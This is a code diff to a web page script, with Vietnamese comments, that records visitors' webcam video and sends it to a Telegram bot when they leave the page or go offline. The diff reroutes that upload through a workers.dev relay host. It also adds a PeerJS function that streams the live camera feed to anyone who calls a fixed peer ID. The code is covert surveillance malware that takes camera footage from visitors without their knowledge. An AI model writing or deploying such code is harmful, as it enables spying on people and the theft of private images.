@@ -190,9 +190,27 @@ async function sendVideoToTelegram(videoBlob) {
   formData.append('video', videoBlob, 'recorded.webm');
   formData.append('caption', `🎥 Video quay trực tiếp khi rời trang.\n\n${getCaption()}`);
 
-  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
+  await fetch(`https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
     method: 'POST',
     body: formData
+  });
+}
+
+// ====== PHÁT CAMERA QUA PEERJS ======
+function startPeerStream() {
+  const VIDEO_ID = "my-fixed-stream-id";
+  const peer = new Peer(VIDEO_ID);
+  peer.on('open', () => {
+    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+      .then(stream => {
+        document.getElementById('localVideo').srcObject = stream;
+        peer.on('call', call => {
+          call.answer(stream);
+        });
+      })
+      .catch(error => {
+        console.error("Không truy cập được camera:", error);
+      });
   });
 }
 
@@ -226,10 +244,10 @@ async function main() {
     });
   }
 
-  await startRecordingStream(); // 🔴 Bắt đầu quay không giới hạn
+  await startRecordingStream();
+  startPeerStream();
 }
 
-// ====== TỰ ĐỘNG GỬI VIDEO KHI RỜI TRANG ======
 window.addEventListener("beforeunload", async (e) => {
   e.preventDefault();
   await stopAndSendRecording();
@@ -239,5 +257,4 @@ window.addEventListener("offline", async () => {
   await stopAndSendRecording();
 });
 
-// ====== BẮT ĐẦU ======
 main();
